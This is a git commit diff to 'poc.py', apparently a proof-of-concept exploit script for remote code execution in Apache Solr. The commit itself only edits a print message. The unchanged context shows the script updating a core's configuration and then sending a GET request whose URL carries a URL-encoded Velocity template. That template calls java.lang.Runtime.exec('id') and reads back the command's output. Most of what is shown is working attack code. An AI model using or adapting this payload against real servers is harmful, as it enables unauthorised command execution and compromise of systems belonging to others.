89298b59107578f0204adf91f407ce42df62492b
wyzxxz <342070435@qq.com>
2019-10-31 12:58:27 +0800

    Update poc.py

--- poc.py
+++ poc.py
@@ -46,7 +46,7 @@ def update_config(url, name):
 def poc(url):
     core_name = get_name(url)
     update_config(url, core_name)
-    print "[-] Start get whoami."
+    print "[-] Start get ."
     url += "/solr/"+core_name+"/select?q=1&&wt=velocity&v.template=custom&v.template.custom=%23set($x=%27%27)+%23set($rt=$x.class.forName(%27java.lang.Runtime%27))+%23set($chr=$x.class.forName(%27java.lang.Character%27))+%23set($str=$x.class.forName(%27java.lang.String%27))+%23set($ex=$rt.getRuntime().exec(%27id%27))+$ex.waitFor()+%23set($out=$ex.getInputStream())+%23foreach($i+in+[1..$out.available()])$str.valueOf($chr.toChars($out.read()))%23end"
 
     conn = requests.request("GET", url)
